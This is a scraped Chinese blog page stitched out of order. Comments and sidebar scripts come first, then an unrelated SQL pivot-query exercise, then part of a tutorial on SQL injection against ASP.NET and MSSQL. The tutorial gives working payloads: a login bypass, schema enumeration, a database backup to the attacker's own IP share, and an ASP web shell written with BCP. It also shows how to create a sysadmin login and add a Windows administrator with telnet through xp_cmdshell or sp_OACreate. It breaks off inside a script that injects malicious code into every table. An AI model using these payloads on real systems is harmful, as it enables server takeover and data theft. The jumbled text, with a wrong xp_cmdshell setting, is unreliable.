[好文要顶](javascript:void(0);) [关注我](javascript:void(0);) [收藏该文](javascript:void(0);) [![](https://common.cnblogs.com/images/icon_weibo_24.png)](javascript:void(0); "分享至新浪微博") [![](https://common.cnblogs.com/images/wechat.png)](javascript:void(0); "分享至微信")

[![](https://pic.cnblogs.com/face/u106337.jpg?id=13140010)](https://home.cnblogs.com/u/heyuquan/)

[滴答的雨](https://home.cnblogs.com/u/heyuquan/)  
[关注 \- 78](https://home.cnblogs.com/u/heyuquan/followees/)  
[粉丝 \- 2323](https://home.cnblogs.com/u/heyuquan/followers/)

推荐博客

[+加关注](javascript:void(0);)

[关注 【滴答的雨】](javascript:void(0);)

257

1

[快速评论](javascript:void(0);)     [返回顶部](#top)

currentDiggType = 0;

[«](https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html) 上一篇： [博客美化：通用代码高亮插件（SyntaxHighlighter）](https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html "发布于 2012-09-28 18:52")  
[»](https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html) 下一篇： [（译）关于async与await的FAQ](https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html "发布于 2012-11-30 11:04")

posted on 2012-10-31 19:38 [滴答的雨](https://www.cnblogs.com/heyuquan/) 阅读(140430) 评论(212) [编辑](https://i.cnblogs.com/EditPosts.aspx?postid=2748577) [收藏](javascript:void(0))

markdown_highlight(); var allowComments = true, cb\_blogId = 113108, cb\_blogApp = 'heyuquan', cb\_blogUserGuid = '7c8a509c-abf3-de11-ba8f-001cf0cd104b'; var cb\_entryId = 2748577, cb\_entryCreatedDate = '2012-10-31 19:38', cb\_postType = 1; loadViewCount(cb_entryId);

[< Prev](#!comments) [1](#!comments) [2](#!comments) [3](#!comments) [4](#!comments) 5

  
**评论:**

[#201楼](#3347124) 2016-01-13 18:01 | [venices](https://www.cnblogs.com/venice/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

不错，值得学习

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#202楼](#3366427) 2016-02-25 09:02 | [RyanLe](https://home.cnblogs.com/u/897726/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

楼主，你好，才开始涉及安全，请问下您这里有没有注入工具可供下载。

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#203楼](#3415676) 2016-04-22 21:19 | [心云linda](https://www.cnblogs.com/ITLearner-Linda/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

请问这里  
a) 猜测数据库名： and db_name() >0 或系统表master.dbo.sysdatabases  
是怎么用master.dbo.sysdatabases猜数据库名的？

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#204楼](#3470311) 2016-07-14 20:38 | [ppassion](https://home.cnblogs.com/u/992638/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

博主大大你好，源码中是不包含数据库的吗，好像程序不能运行

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#205楼](#3499002) 2016-08-29 17:58 | [一百零七个](https://www.cnblogs.com/zzry/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark!

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

https://pic.cnblogs.com/face/983981/20160629093639.png   

[#206楼](#3527913) 2016-10-11 10:35 | [吴某1](https://www.cnblogs.com/webster1/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

666

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

https://pic.cnblogs.com/face/723162/20150212174325.png   

[#207楼](#3535869) 2016-10-19 14:45 | [浮生若梦丶丨](https://home.cnblogs.com/u/896034/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

666666

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#208楼](#3561995) 2016-11-22 11:01 | [jianiu](https://www.cnblogs.com/mingjia/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#209楼](#3790634) 2017-09-20 11:15 | [浮生若梦丶丨](https://www.cnblogs.com/sanfor/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

6666

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

https://pic.cnblogs.com/face/896034/20170905135439.png   

[#210楼](#3803494) 2017-10-06 15:32 | [成长记实录](https://home.cnblogs.com/u/1252222/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

点错了 抱歉 手贱我

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#211楼](#3803495) 2017-10-06 15:32 | [成长记实录](https://home.cnblogs.com/u/1252222/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[#212楼](#3905324) 3905324 2018/2/7 上午10:55:59 2018-02-07 10:55 | [暗夜苹果](https://www.cnblogs.com/dahuo/)  

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark

[支持(0)](javascript:void(0);) [反对(0)](javascript:void(0);)

  

[< Prev](#!comments) [1](#!comments) [2](#!comments) [3](#!comments) [4](#!comments) 5

var commentManager = new blogCommentManager(); commentManager.renderComments(0);

[刷新评论](javascript:void(0);)[刷新页面](#)[返回顶部](#top)

注册用户登录后才能发表评论，请 [登录](javascript:void(0);) 或 [注册](javascript:void(0);)， [访问](https://www.cnblogs.com/) 网站首页。

[【推荐】超50万行VC++源码: 大型组态工控、电力仿真CAD与GIS源码库](http://www.ucancode.com/index.htm)  
[【活动】京东云限时优惠1.5折购云主机，最高返价值1000元礼品！](https://www.jdcloud.com/cn/activity/newUser?utm_source=DMT_cnblogs&utm_medium=CH&utm_campaign=09vm&utm_term=Virtual-Machines)  
[【推荐】腾讯云海外云服务器1核2G19.8元/月](https://cloud.tencent.com/act/pro/overseas?fromSource=gwzcw.2802159.2802159.2802159&utm_medium=cpc&utm_id=gwzcw.2802159.2802159.2802159)  
[【推荐】919 天翼云钜惠，全网低价，云主机9元轻松购](https://www.ctyun.cn/activity/#/20190919?hmsr=%E5%8D%9A%E5%AE%A2%E5%9B%AD-0916-919%E6%B4%BB%E5%8A%A8&hmpl=&hmcu=&hmkw=&hmci=)  
[【推荐】华为云文字识别资源包重磅上市，1元万次限时抢购](http://clickc.admaster.com.cn/c/a131575,b3595121,c1705,i0,m101,8a1,8b3,h)  
[【福利】git pull && cherry-pick 博客园&华为云百万代金券](https://www.cnblogs.com/cmt/p/11505603.html)  

var googletag = googletag || {}; googletag.cmd = googletag.cmd || \[\]; googletag.cmd.push(function () { googletag.defineSlot("/1090369/C1", \[300, 250\], "div-gpt-ad-1546353474406-0").addService(googletag.pubads()); googletag.defineSlot("/1090369/C2", \[468, 60\], "div-gpt-ad-1539008685004-0").addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });

**相关博文：**  
· [SQL注入攻防入门详解](https://www.cnblogs.com/caoyan/archive/2012/12/01/SQL注入攻防入门详解.html "SQL注入攻防入门详解")  
· [SQL注入浅水攻防](https://www.cnblogs.com/jiangu66/p/3206821.html "SQL注入浅水攻防")  
· [SQL注入攻防入门详解](https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html "SQL注入攻防入门详解")  
· [SQL注入攻防入门详解](https://www.cnblogs.com/bily101/archive/2013/05/03/3055745.html "SQL注入攻防入门详解")  
· [SQL注入攻防入门详解](https://www.cnblogs.com/chorrysky/archive/2013/02/22/2922034.html "SQL注入攻防入门详解")  

**最新 IT 新闻**:  
· [掉入黑洞会怎样？被拉成“面条”，还是前往另一个宇宙？](//news.cnblogs.com/n/641596/)  
· [“走出非洲”的观点已经过时？](//news.cnblogs.com/n/641595/)  
· [卓易科技和优刻得科创板过会](//news.cnblogs.com/n/641594/)  
· [牛津博士大胆设想：平流层中借西风，氢气飞艇零耗能](//news.cnblogs.com/n/641593/)  
· [阿里和谷歌自研AI芯片商用，科技巨头与芯片巨头关系生变](//news.cnblogs.com/n/641592/)  
» [更多新闻...](https://news.cnblogs.com/ "IT 新闻")

fixPostBody(); setTimeout(function () { incrementViewCount(cb\_entryId); }, 50); deliverAdT2(); deliverAdC1(); deliverAdC2(); loadNewsAndKb(); loadBlogSignature(); LoadPostCategoriesTags(cb\_blogId, cb\_entryId); LoadPostInfoBlock(cb\_blogId, cb\_entryId, cb\_blogApp, cb\_blogUserGuid); GetPrevNextPost(cb\_entryId, cb\_blogId, cb\_entryCreatedDate, cb\_postType); loadOptUnderPost(); GetHistoryToday(cb\_blogId, cb\_blogApp, cb\_entryCreatedDate);

loadBlogNews();

loadBlogDefaultCalendar();  

### 积分与排名

*   积分 \- 218934
*   排名 \- 1762

### 随笔分类

*   [DevOps(4)](https://www.cnblogs.com/heyuquan/category/1378387.html)
*   [dotnet(50)](https://www.cnblogs.com/heyuquan/category/368748.html)
*   [安全设计(4)](https://www.cnblogs.com/heyuquan/category/368749.html)
*   [大前端(6)](https://www.cnblogs.com/heyuquan/category/480073.html)
*   [工具(8)](https://www.cnblogs.com/heyuquan/category/1528801.html)
*   [架构设计(6)](https://www.cnblogs.com/heyuquan/category/1378386.html)
*   [商业模式|商业分析(1)](https://www.cnblogs.com/heyuquan/category/576644.html)
*   [数据结构与算法(3)](https://www.cnblogs.com/heyuquan/category/595135.html)
*   [数据库(1)](https://www.cnblogs.com/heyuquan/category/1378402.html)
*   [异步编程(20)](https://www.cnblogs.com/heyuquan/category/1528802.html)

### 最新评论

*   [1\. Re:.NET Core 学习资料精选：进阶](https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4352998)
*   良心博主
*   --ice_man1987
*   [2\. Re:.NET Core 学习资料精选：进阶](https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4351038)
*   整理的很齐全，质量很好。
*   --sunyuliang
*   [3\. Re:.NET Core 学习资料精选：进阶](https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4350491)
*   @ 权@oneDDN@何慕@【可乐不加冰】谢谢支持。...
*   --滴答的雨
*   [4\. Re:.NET Core 学习资料精选：进阶](https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4350489)
*   必须要点个赞!
*   --权
*   [5\. Re:.NET Core 学习资料精选：进阶](https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html#4349408)
*   很全面的资源整理，非常感谢楼主
*   --oneDDN

### 阅读排行榜

*   [1\. 使用jQuery.form插件，实现完美的表单异步提交(178850)](https://www.cnblogs.com/heyuquan/p/form-plug-async-submit.html)
*   [2\. SQL注入攻防入门详解(140693)](https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html)
*   [3\. 触碰jQuery：AJAX异步详解(99573)](https://www.cnblogs.com/heyuquan/archive/2013/05/13/js-jquery-ajax.html)
*   [4\. 如何在高并发分布式系统中生成全局唯一Id(77380)](https://www.cnblogs.com/heyuquan/p/global-guid-identity-maxId.html)
*   [5\. Linq之旅：Linq入门详解（Linq to Objects）(73199)](https://www.cnblogs.com/heyuquan/p/Linq-to-Objects.html)
*   [6\. 你必须懂的 T4 模板：深入浅出(49523)](https://www.cnblogs.com/heyuquan/archive/2012/07/26/2610959.html)
*   [7\. 博客美化：通用代码高亮插件（SyntaxHighlighter）(44940)](https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html)
*   [8\. .NET开发邮件发送功能的全面教程(含邮件组件源码)(41901)](https://www.cnblogs.com/heyuquan/p/net-batch-mail-send-async.html)
*   [9\. 异步编程：使用线程池管理线程(21692)](https://www.cnblogs.com/heyuquan/archive/2012/12/23/threadPool-manager.html)
*   [10\. 面试必知的冒泡排序和快速排序(21460)](https://www.cnblogs.com/heyuquan/p/bubble-quick-sort.html)

### 推荐排行榜

*   [1\. .NET开发邮件发送功能的全面教程(含邮件组件源码)(321)](https://www.cnblogs.com/heyuquan/p/net-batch-mail-send-async.html)
*   [2\. SQL注入攻防入门详解(257)](https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html)
*   [3\. 如何在高并发分布式系统中生成全局唯一Id(234)](https://www.cnblogs.com/heyuquan/p/global-guid-identity-maxId.html)
*   [4\. 触碰jQuery：AJAX异步详解(216)](https://www.cnblogs.com/heyuquan/archive/2013/05/13/js-jquery-ajax.html)
*   [5\. Linq之旅：Linq入门详解（Linq to Objects）(204)](https://www.cnblogs.com/heyuquan/p/Linq-to-Objects.html)
*   [6\. .NET Core 学习资料精选：进阶(163)](https://www.cnblogs.com/heyuquan/p/dotnet-advance-learning-resource.html)
*   [7\. .NET Core 学习资料精选：入门(162)](https://www.cnblogs.com/heyuquan/p/dotnet-basic-learning-resource.html)
*   [8\. 异步编程：线程概述及使用(161)](https://www.cnblogs.com/heyuquan/archive/2012/12/16/thread-base-and-use.html)
*   [9\. 电子商务知识精华，开发不再只懂代码(159)](https://www.cnblogs.com/heyuquan/p/e-business-summary-share.html)
*   [10\. \[译\]ASP.NET：WebForms vs MVC(137)](https://www.cnblogs.com/heyuquan/p/webForms-vs-mvc.html)

loadBlogSideColumn();

Powered by: [博客园](http://www.cnblogs.com) 模板提供：[沪江博客](http://blog.hjenglish.com) Copyright © 2019 滴答的雨  
Powered by .NET Core 3.0.0-preview9-19423-09 on Linux

$(function () { $('.toolbar .help').attr('title', '?'); }); $("#PSignature").ready(function(){ $('#tuijian').click(function(){ eval(""); }); }); $("#mystats").append($("#myStatistics")); var hadLoadDig = false; <!--关注、评论快速入口、返回顶部--> $('#blog-comments-placeholder').ready(function() { var commentTime = setInterval(function(){ diggExtension(); if(hadLoadDig){ had\_focused(); clearTimeout(commentTime); } },200); } ); function focusFunction(){ document.getElementById("tbCommentBody").focus(); } function had\_focused() { var text = $('#p\_b\_follow').text(); if(text=='已关注 -取消'){ $('#guanzhu').text('已关注【滴答的雨】'); } } function after\_guanzhu(){ var commentTime = setInterval(function(){ var text = $('#p\_b\_follow').text(); if(text=='关注成功'){ $('#guanzhu').text('已关注【滴答的雨】'); clearTimeout(commentTime); } },50); } function diggExtension(){ /*在div\_digg中添加关注链接*/ var div\_digg = document.getElementById("div\_digg"); if(div\_digg ){ var my\_div = document.createElement("div"); my\_div.style.padding="0 0 5px 0"; my\_div.innerHTML = "<a id='guanzhu' onclick=\\"follow('7c8a509c-abf3-de11-ba8f-001cf0cd104b');after\_guanzhu()\\" href=\\"javascript:void(0);\\" style=\\"font-weight: bold; padding-left: 5px;text-decoration :underline; \\">关注 【滴答的雨】</a>" div\_digg.insertBefore(my\_div,div\_digg.firstChild); /*添加关注链接结束*/ /*添加评论快速入口*/ $('#div\_digg').append("<div><a onclick=\\"javascript:focusFunction();\\" href=\\"javascript:void(0);\\" style=\\"font-weight: bold; \\">快速评论</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\\"#top\\" style=\\"font-weight: bold; \\">返回顶部</a></div>"); hadLoadDig=true; } } <!--评论，生成气泡效果标签代码--> $('#blog-comments-placeholder').ready( function() { var commentTime = setInterval( function(){ if($(".feedbackItem").length>0) { CommentBubble(); clearTimeout(commentTime); } },50); } ); function CommentBubble() { var w1 = '<div class="list">' + '<table class="out" border="0" cellspacing="0" cellpadding="0"> ' + '<tr>' + '<td class="icontd" align="right" valign="bottom">' + '<img src="https://www.cnblogs.com/images/cnblogs\_com/heyuquan/406488/t\_op.png" width="70px" height="57px"/>' + '</td>' + '<td align="left" valign="bottom" class="q">' + '<table border="0" cellpadding="0" cellspacing="0" style=""> ' + '<tr><td class="topleft"></td><td class="top"></td><td class="topright"></td></tr> ' + '<tr><td class="left"></td> <td align="left" class="conmts"><p>'; var w2 = '</p> </td> <td class="right"></td></tr> ' + '<tr><td class="bottomleft"></td><td class="bottom"></td><td class="bottomright"></td></tr> ' + '</table>' + '</td> ' + '</tr> ' + '</table> ' + '</div>'; $.each($(".blog\_comment_body"), function(i, t) { $(t).html(w1 + $(t).html() + w2); }); $(".louzhu").parent().find('.out') .removeClass("out").addClass("inc"); /*.find(".q").attr("align","right");*/ }## 目标

# 去除 iconfinder 上 icon 的水印 select _ from 后有多个表的使用方法\[转\] (2012-03-27 13:55:34) 转载 ▼ 标签： 杂谈 分类： Oracle/SQL 第一题：(1) 已知一个表的结构为： ------------------- 姓名 科目 成绩 张三 语文 20 张三 数学 30 张三 英语 50 李四 语文 70 李四 数学 60 李四 英语 90 怎样通过 select 语句把他变成以下结构： ------------------------------------ 姓名 语文成绩 数学成绩 英语成绩 张三 20 30 50 李四 70 60 90 insert into student values('李四','英语','90') select _ from student ----法一: 正解如下： select A.姓名,A.成绩 as 语文成绩,B.成绩 as 数学成绩,C.成绩 as 英语成绩 from student A,student B,student C where A.姓名=B.姓名 and B.姓名=C.姓名 and A.科目='语文' and B.科目='数学' and C.科目='英语' --------理解如下： select _ from student A,student B,student C --将三个相同的 student 表相互连接，连接生成 6\*6\*6=216 条记录,因为每个表中有 6 条记录。 where A.姓名=B.姓名 and B.姓名=C.姓名 --对连接表记录进行筛选；得到(3\*3\*3)+(3\*3\*3)=27+27=54 条记录。 and A.科目='语文' and B.科目='数学' and C.科目='英语' --同时筛选三个子表中的科目内容,执行可得如下。 姓名 科目 成绩 姓名 科目 成绩 姓名 科目 成绩 张三 语文 20 张三 数学 30 张三 英语 50 李四 语文 70 李四 数学 60 李四 英语 90 再在 select 中定义一下输出即可。 ----法二：正解如下 select 姓名, sum(case 科目 when '语文' then 成绩 else 0 end) as 语文成绩, sum(case 科目 when '数学' then 成绩 else 0 end) as 数学成绩, sum(case 科目 when '英语' then 成绩 else 0 end) as 英语成绩, avg(成绩) as 平均成绩,sum(成绩) as 总成绩 from student group by 姓名 order by 姓名 desc 结果如下: 姓名 语文成绩 数学成绩 英语成绩 平均成绩 总成绩 张三 20 30 50 33 100 李四 70 60 90 73 220 (2) create table A ( year int, Quarter varchar(30), amount float ) insert A select 2000,'1',1.1 insert A select 2000,'2',1.2 insert A select 2000,'3',1.3 insert A select 2000,'4',1.4 insert A select 2001,'1',2.1 insert A select 2001,'2',2.2 insert A select 2001,'3',2.3 insert A select 2001,'4',2.4 表 A 定义如下： 属性类型 Year Integer Quarter Varchar（30） Amount float Year Quarter Amount 2000 1 1.1 2000 2 1.2 2000 3 1.3 2000 4 1.4 2001 1 2.1 2001 2 2.2 2001 3 2.3 2001 4 2.4 其中每行表表示一个季度的数据。 如果处理表 A 中的数据，得到如下的结果。 Year Quarter1 Quarter2 Quarter3 Quarter4 2000 1.1 1.2 1.3 1.4 2001 2.1 2.2 2.3 2.4 请用 SQL 写一段代码实现。 ---法一:正解如下： select T1.YEAR,T1.amount as Quarter1,T2.amount as Quarter2,T3.amount as Quarter3,T4.amount as Quarter4 from A T1,A T2,A T3,A T4 WHERE T1.YEAR=T2.YEAR AND T2.YEAR=T3.YEAR AND T3.YEAR=T4.YEAR AND T1.Quarter='1' and T2.Quarter='2' and T3.Quarter='3' and T4.Quarter='4' ---法二:正解如下： select year, sum(case Quarter when '1' then Amount else 0 end) as Quarter1, sum(case Quarter when '2' then Amount else 0 end) as Quarter2, sum(case Quarter when '3' then Amount else 0 end) as Quarter3, sum(case Quarter when '4' then Amount else 0 end) as Quarter4, sum(Amount) as ALLAmount from A group by year order by year 第二题： 有一张老师表 T(T_ID,T_NAME)； 有一张学生表 S(S_ID,S_NAME)； 有一张班级表 C(T_ID,S_ID,C_NAME)， 其中 C_NAME 的取值只有‘大班’和‘小班’， 请查询出符合条件的老师的名字，条件是老师在大班中带的学生数大于此老师在小班中带的学生数。 （最好用子查询吧，题目是这么要求的，另数据库用的是 SQL Server） select _ from T, (select count(_) as x,T_ID from C where c_name='小班' group by T_ID) a, (select count(_) as x,T_ID from C where c_name='大班' group by T_ID) b where b.x >a.x and a.T_ID=b.T_ID and T.T_ID=b.T_ID 第三题 某个公司的面试题，题目如下： 1、找出哪些工资高于他们所在部门的平均工资的员工； -------------------------------------------------- select A._ from 工资表 a join（select 部门代码，AVG（工资）as 平均工资 from 工资表 group by 部门代码）B on a.部门代码＝ B.部门代码 where a.工资>B.平均工资 2、找出哪些工资高于他们所在部门的 manager(经理）的工资的员工; -------------------------------------------------------------- select A._ from 工资表 a join （select \* from 工资表 where 职务＝经理）B on a.部门代码＝ B.部门代码 where a.工资>B.工资[SQL 注入攻防入门详解](https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html)

毕业开始从事 winform 到今年转到 web ，在码农届已经足足混了快接近 3 年了，但是对安全方面的知识依旧薄弱，事实上是没机会接触相关开发……必须的各种借口。这几天把 sql 注入的相关知识整理了下，希望大家多多提意见。

（对于 sql 注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验，为避免后知后觉的犯下大错，专门查看大量前辈们的心得，这方面的资料颇多，将其精简出自己觉得重要的，就成了该文）

下面的程序方案是采用 ASP.NET + MSSQL，其他技术在设置上会有少许不同。

[示例程序下载：SQL 注入攻防入门详解\_示例](http://files.cnblogs.com/heyuquan/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3_%E7%A4%BA%E4%BE%8B.rar)

什么是 SQL 注入（SQL Injection）

所谓 SQL 注入式攻击，就是攻击者把 SQL 命令插入到 Web 表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的 SQL 命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态 SQL 命令，或作为存储过程的输入参数，这类表单特别容易受到 SQL 注入式攻击。

尝尝 SQL 注入

1. 一个简单的登录页面

关键代码：（详细见下载的示例代码）

[?](# "?")

1

2

3

4

5

6

`private` `bool` ` NoProtectLogin(``string ` `userName,` `string` `password)`

`{`

`int` ` count = (``int``)SqlHelper.Instance.ExecuteScalar(``string``.Format `

` (``"SELECT COUNT(*) FROM Login WHERE UserName='{0}' AND Password='{1}'"``, userName, password)); `

`return` `count > 0 ?` `true` `:` ` false``; `

`}`

方法中 userName 和 password 是没有经过任何处理，直接拿前端传入的数据，这样拼接的 SQL 会存在注入漏洞。（帐户：admin 123456）

1. 输入正常数据，效果如图：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922046482.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311921598057.png)

合并的 SQL 为：

SELECT COUNT(\*) FROM Login WHERE UserName='admin' AND Password='123456'

2. 输入注入数据：

如图，即用户名为：用户名：admin’—，密码可随便输入

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922089084.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/20121031192207853.png)

合并的 SQL 为：

SELECT COUNT(\*) FROM Login WHERE UserName='admin'-- Password='123'

因为 UserName 值中输入了“--”注释符，后面语句被省略而登录成功。（常常的手法：前面加上'; ' (分号，用于结束前一条语句)，后边加上'--' (用于注释后边的语句)）

2. 上面是最简单的一种 SQL 注入，常见的注入语句还有：

1) 猜测数据库名，备份数据库

a) 猜测数据库名： and db_name() >0 或系统表 master.dbo.sysdatabases

b) 备份数据库：;backup database 数据库名 to disk = ‘c:\\\*.db’;--

或：declare @a sysname;set @a=db_name();backup database @a to disk='你的 IP 你的共享目录 bak.dat' ,name='test';--

2. 猜解字段名称

a) 猜解法：and (select count(字段名) from 表名)>0 若“字段名”存在，则返回正常

b) 读取法：and (select top 1 col_name(object_id('表名'),1) from sysobjects)>0 把 col_name(object_id('表名'),1)中的 1 依次换成 2,3,4,5，6…就可得到所有的字段名称。

3. 遍历系统的目录结构，分析结构并发现 WEB 虚拟目录（服务器上传木马）

先创建一个临时表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--

a) 利用 xp_availablemedia 来获得当前所有驱动器,并存入 temp 表中

;insert temp exec master.dbo.xp_availablemedia;--

b) 利用 xp_subdirs 获得子目录列表,并存入 temp 表中

;insert into temp(id) exec master.dbo.xp_subdirs 'c:\\';--

c) 利用 xp_dirtree 可以获得“所有”子目录的目录树结构,并存入 temp 表中

;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\\';-- （实验成功）

d) 利用 bcp 命令将表内容导成文件

即插入木马文本，然后导出存为文件。比如导出为 asp 文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）

Exec master..xp_cmdshell N'BCP "select \* from SchoolMarket.dbo.GoodsStoreData;" queryout c:/inetpub/wwwroot/runcommand.asp -w -S"localhost" -U"sa" -P"123"'

(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)

在 sql 查询器中通过语句：Exec master..xp_cmdshell N'BCP’即可查看 BCP 相关参数，如图：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214125740.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214126330.png)

4. 查询当前用户的数据库权限

MSSQL 中一共存在 8 种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。

可通过 1=(select IS_SRVROLEMEMBER('sysadmin'))得到当前用户是否具有该权限。

5. 设置新的数据库帐户（得到 MSSQL 管理员账户）

d) 在数据库内添加一个 hax 用户，默认密码是空

;exec sp_addlogin'hax';--

e) 给 hax 设置密码 (null 是旧密码，password 是新密码，user 是用户名)

;exec master.dbo.sp_password null,password,username;--

f) 将 hax 添加到 sysadmin 组

;exec master.dbo.sp_addsrvrolemember 'hax' ,'sysadmin';--

6. xp_cmdshell MSSQL 存储过程（得到 WINDOWS 管理员账户 ）

通过(5)获取到 sysadmin 权限的帐户后，使用查询分析器连接到数据库，可通过 xp_cmdshell 运行系统命令行（必须是 sysadmin 权限），即使用 cmd.exe 工具，可以做什么自己多了解下。

下面我们使用 xp_cmdshell 来创建一个 Windows 用户，并开启远程登录服务：

a) 判断 xp_cmdshell 扩展存储过程是否存在

SELECT count(\*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell'

b) 恢复 xp_cmdshell 扩展存储过程

Exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\\inetput\\web\\xplog70.dll';

开启后使用 xp_cmdshell 还会报下面错误：

SQL Server 阻止了对组件 'xp_cmdshell' 的过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。

通过执行下面语句进行设置：

\-\- 允许配置高级选项

EXEC sp_configure 'show advanced options', 1

GO

\-\- 重新配置

RECONFIGURE

GO

\-\- 启用 xp_cmdshell

EXEC sp_configure 'xp_cmdshell', 0

GO

--重新配置

RECONFIGURE

GO

c) 禁用 xp_cmdshell 扩展存储过程

Exec master.dbo.sp_dropextendedproc 'xp_cmdshell';

d) 添加 windows 用户：

Exec xp_cmdshell 'net user awen /add';

e) 设置好密码：

Exec xp_cmdshell 'net user awen password';

f) 提升到管理员：

Exec xp_cmdshell 'net localgroup administrators awen /add';

g) 开启 telnet 服务：

Exec xp_cmdshell 'net start tlntsvr'

7. 没有 xp_cmdshell 扩展程序，也可创建 Windows 帐户的办法.

(本人 windows7 系统，测试下面 SQL 语句木有效果)

declare @shell int ;

execsp_OAcreate 'w script .shell',@shell output ;

execsp_OAmethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c net user awen /add';

execsp_OAmethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c net user awen 123';

execsp_OAmethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c net localgroup administrators awen /add';

在使用的时候会报如下错：

SQL Server 阻止了对组件 'Ole Automation Procedures' 的过程 'sys.sp_OACreate'、'sys.sp_OAMethod' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'Ole Automation Procedures'。有关启用 'Ole Automation Procedures' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。

解决办法：

sp_configure 'show advanced options', 1;

GO

RECONFIGURE;

GO

sp_configure 'Ole Automation Procedures', 1;

GO

RECONFIGURE;

GO

好了，这样别人可以登录你的服务器了，你怎么看？

8. 客户端脚本攻击

攻击 1：（正常输入）攻击者通过正常的输入提交方式将恶意脚本提交到数据库中，当其他用户浏览此内容时就会受到恶意脚本的攻击。

措施：转义提交的内容，.NET 中可通过 System.Net.WebUtility.HtmlEncode(string) 方法将字符串转换为 HTML 编码的字符串。

攻击 2：（SQL 注入）攻击者通过 SQL 注入方式将恶意脚本提交到数据库中，直接使用 SQL 语法 UPDATE 数据库，为了跳过 System.Net.WebUtility.HtmlEncode(string) 转义，攻击者会将注入 SQL 经过“HEX 编码”，然后通过 exec 可以执行“动态”SQL 的特性运行脚本”。

参考：

注入：[SQL 注入案例曝光，请大家提高警惕](http://www.cnblogs.com/ryu666/archive/2009/07/28/1533248.html)

恢复：[批量清除数据库中被植入的 js](http://blog.sina.com.cn/s/blog_5e5d98b50100dlz9.html)

示例代码：（可在示例附带的数据库测试）

a) 向当前数据库的每个表的每个字段插入一段恶意脚本

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

12

13

`Declare` `@T` ` Varchar``(255),@C ` ` Varchar``(255) `

`Declare` `Table_Cursor` `Cursor` `For`

`Select` ` A.``Name``,B.``Name `

